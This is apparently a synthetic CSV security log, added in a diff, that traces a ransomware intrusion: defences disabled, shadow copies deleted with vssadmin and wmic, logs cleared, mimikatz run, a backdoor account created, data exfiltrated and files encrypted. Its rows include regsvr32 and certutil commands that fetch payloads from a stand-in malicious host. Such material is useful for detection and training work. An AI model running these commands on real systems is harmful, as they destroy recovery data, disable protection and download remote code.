@@ -1,0 +1,62 @@
+timestamp,user,action,source,target,status,details
+2025-03-01 08:15:23,admin,login,192.168.1.5,server01,success,Successful login
+2025-03-01 08:30:45,admin,file_access,192.168.1.5,/var/log/security.log,success,Read access to security logs
+2025-03-01 09:12:36,system,service_start,localhost,svchost.exe,success,Windows service started
+2025-03-01 10:45:12,user1,file_write,192.168.1.10,document.docx,success,File saved
+2025-03-01 11:23:56,user2,file_download,192.168.1.15,update.exe,success,File downloaded from https://example.com/update.exe
+2025-03-01 12:10:33,admin,user_modify,192.168.1.5,user3,success,Added user3 to administrators group
+2025-03-01 13:15:42,system,registry_edit,localhost,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,success,Added new autorun entry
+2025-03-01 14:20:18,user1,login_failed,192.168.1.10,server01,failure,Invalid password - 3 attempts
+2025-03-01 15:35:27,user3,file_write,192.168.1.20,report.xlsx,success,File saved
+2025-03-01 16:45:59,admin,firewall_modify,192.168.1.5,Windows Firewall,success,Added rule for port 3389
+2025-03-01 17:12:23,system,service_stop,localhost,Windows Defender,success,AntiVirus service stopped
+2025-03-01 18:05:42,user2,file_access,192.168.1.15,\\server01\shared\confidential.pdf,denied,Access denied - insufficient permissions
+2025-03-01 19:23:14,unknown,login_attempt,185.117.73.76,server01,failure,Failed login attempt from external IP
+2025-03-01 20:10:35,admin,command_executed,192.168.1.5,cmd.exe,success,Command executed: bcdedit /set {current} recoveryenabled No
+2025-03-01 21:05:08,admin,command_executed,192.168.1.5,powershell.exe,success,PowerShell executed with parameters: -EncodedCommand
+2025-03-01 22:12:56,system,registry_edit,localhost,HKLM\SOFTWARE\Policies\Microsoft\Windows Defender,success,Modified DisableAntiSpyware
+2025-03-01 23:30:18,admin,command_executed,192.168.1.5,wmic.exe,success,Command executed: wmic shadowcopy delete
+2025-03-02 00:15:42,admin,process_started,192.168.1.5,mimikatz.exe,success,Process started
+2025-03-02 01:20:33,system,file_modify,localhost,C:\Users\admin\Desktop\important.docx,success,File renamed to important.docx.locked
+2025-03-02 02:10:45,unknown,network_connection,193.218.118.231,server01:445,established,SMB connection established
+2025-03-02 03:05:22,system,service_stop,localhost,MpsSvc,success,Windows Firewall Service stopped
+2025-03-02 04:12:38,admin,scheduled_task,192.168.1.5,Task Scheduler,success,Created new task: System /run backup.bat
+2025-03-02 05:30:15,system,file_write,localhost,C:\Windows\System32\drivers\etc\hosts,success,Modified hosts file
+2025-03-02 06:45:22,admin,command_executed,192.168.1.5,vssadmin.exe,success,Command executed: vssadmin delete shadows /all /quiet
+2025-03-02 07:15:36,system,registry_edit,localhost,HKLM\System\CurrentControlSet\Control\Terminal Server,success,Modified fDenyTSConnections to 0
+2025-03-02 08:30:42,admin,user_add,192.168.1.5,backdoor_user,success,New user added to system
+2025-03-02 09:10:55,user1,file_access,192.168.1.10,\\server01\finance\payroll.xlsx,success,Read access to payroll data
+2025-03-02 10:25:18,user2,login,192.168.1.15,server01,success,User logged in
+2025-03-02 11:05:27,system,bitlocker,localhost,C:\,success,BitLocker encryption forced on system drive
+2025-03-02 12:30:35,admin,command_executed,192.168.1.5,netsh.exe,success,Command executed: netsh advfirewall set allprofiles state off
+2025-03-02 13:45:22,admin,process_created,192.168.1.5,regsvr32.exe,success,Process started with params: /s /u /i:http://malicious.example.com/payload.dll scrobj.dll
+2025-03-02 14:20:18,user3,file_encrypt,192.168.1.20,customer_data.xlsx,success,File encrypted
+2025-03-02 14:21:26,user3,file_encrypt,192.168.1.20,financial_report.docx,success,File encrypted
+2025-03-02 14:22:45,user3,file_encrypt,192.168.1.20,contacts.csv,success,File encrypted
+2025-03-02 14:23:38,user3,file_encrypt,192.168.1.20,business_plan.pptx,success,File encrypted
+2025-03-02 14:24:12,user3,file_encrypt,192.168.1.20,contracts.zip,success,File encrypted
+2025-03-02 14:25:36,user3,file_encrypt,192.168.1.20,employee_records.xlsx,success,File encrypted
+2025-03-02 14:26:59,user3,file_encrypt,192.168.1.20,passwords.txt,success,File encrypted
+2025-03-02 14:28:23,user3,file_encrypt,192.168.1.20,meeting_notes.docx,success,File encrypted
+2025-03-02 14:29:43,user3,file_encrypt,192.168.1.20,marketing_campaign.pptx,success,File encrypted
+2025-03-02 14:30:17,user3,file_encrypt,192.168.1.20,source_code.zip,success,File encrypted
+2025-03-02 14:31:45,user3,file_encrypt,192.168.1.20,project_timeline.xlsx,success,File encrypted
+2025-03-02 14:32:28,user3,file_encrypt,192.168.1.20,client_list.csv,success,File encrypted
+2025-03-02 15:05:22,system,file_write,localhost,C:\Users\user3\Desktop\DECRYPT_MY_FILES.txt,success,Ransomware note created
+2025-03-02 16:30:45,unknown,network_connection,91.209.70.154,server01:4444,established,Connection to command and control server
+2025-03-02 17:15:28,admin,command_executed,192.168.1.5,cmd.exe,success,Command executed: wevtutil cl Security
+2025-03-02 18:20:36,admin,command_executed,192.168.1.5,powershell.exe,success,PowerShell command: Set-MpPreference -DisableRealtimeMonitoring $true
+2025-03-02 19:30:42,unknown,login_attempt,51.68.152.42,server01,failure,Failed login attempt from external IP
+2025-03-02 20:05:18,admin,registry_edit,192.168.1.5,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System,success,Modified EnableLUA to 0
+2025-03-02 21:15:33,system,file_modify,localhost,C:\Program Files\Windows Defender\MSASCui.exe,success,File modified
+2025-03-02 22:30:15,user1,login,192.168.1.10,server01,success,User logged in
+2025-03-02 23:45:22,admin,user_privilege,192.168.1.5,backdoor_user,success,Modified user privileges: SeDebugPrivilege
+2025-03-03 00:10:35,backdoor_user,login,192.168.1.100,server01,success,User logged in from new workstation
+2025-03-03 01:25:42,backdoor_user,file_access,192.168.1.100,\\server01\shared\strategic_plan.docx,success,File accessed
+2025-03-03 02:30:17,backdoor_user,network_connection,192.168.1.100,195.54.32.100:443,established,Encrypted connection established
+2025-03-03 03:15:29,backdoor_user,data_transfer,192.168.1.100,195.54.32.100,success,Large data transfer: 1.2GB
+2025-03-03 04:20:42,backdoor_user,command_executed,192.168.1.100,certutil.exe,success,Command executed: certutil -urlcache -split -f http://malicious.example.com/tool.exe
+2025-03-03 05:35:18,system,file_write,localhost,C:\Windows\System32\lsass.exe,denied,Access denied to critical system file
+2025-03-03 06:45:22,backdoor_user,process_started,192.168.1.100,schtasks.exe,success,Scheduled task created for persistence
+2025-03-03 07:15:36,system,registry_edit,localhost,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,success,Added new autorun entry: backdoor.exe
+2025-03-03 08:30:19,admin,login,192.168.1.5,server01,success,Successful login
